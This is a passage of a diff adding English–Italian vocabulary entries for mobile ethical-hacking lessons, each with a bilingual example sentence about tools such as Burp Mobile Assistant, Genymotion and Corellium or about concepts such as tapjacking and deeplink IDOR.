+        "example": "An insecure deeplink let any web page trigger a fund-transfer activity inside the banking app without re-authentication, classic mobile IDOR. = Un deeplink insicuro permetteva a qualsiasi pagina web di attivare un'activity di trasferimento fondi dentro l'app bancaria senza ri-autenticazione, classico IDOR mobile."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "Tapjacking",
+      "set": {
+        "example": "A tapjacking PoC overlaid a transparent activity on top of the bank app and tricked the user into approving a transfer with a single tap. = Un PoC di tapjacking ha sovrapposto un'activity trasparente sopra l'app bancaria e ha ingannato l'utente facendogli approvare un trasferimento con un solo tap."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_4",
+      "english": "Burp Mobile Assistant",
+      "set": {
+        "italian": "Burp Mobile Assistant",
+        "example": "In one step, Burp Mobile Assistant installed the Burp CA on the test phone, removing the manual cert push that often broke on Android 11+. = In un solo passo, Burp Mobile Assistant ha installato il CA Burp sul telefono di test, eliminando il push manuale del cert che spesso si rompeva su Android 11+."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_4",
+      "english": "Genymotion",
+      "set": {
+        "italian": "Genymotion",
+        "example": "For Android testing, Genymotion offered fast snapshotable images with Play Services that ran the target APK far smoother than the stock emulator. = Per il test Android, Genymotion ha offerto immagini veloci e snapshottabili con Play Services che eseguivano l'APK target molto più fluido dell'emulatore stock."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_4",
+      "english": "Corellium",
+      "set": {
+        "italian": "Corellium",
+        "example": "On the cloud, Corellium booted virtual iPhones so the team could test the same iOS app on five different firmware versions in parallel. = Nel cloud, Corellium ha avviato iPhone virtuali così il team poteva testare la stessa app iOS su cinque diverse versioni di firmware in parallelo."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_4",
+      "english": "iMobax",
+      "set": {
+        "italian": "iMobax",
+        "example": "During the audit, iMobax helped map every registered iOS deep link in the target app, surfacing two undocumented schemes worth probing. = Durante l'audit, iMobax ha aiutato a mappare ogni deep link iOS registrato nell'app target, rivelando due schemi non documentati da indagare."
+      }
+    }
+  ]
+}
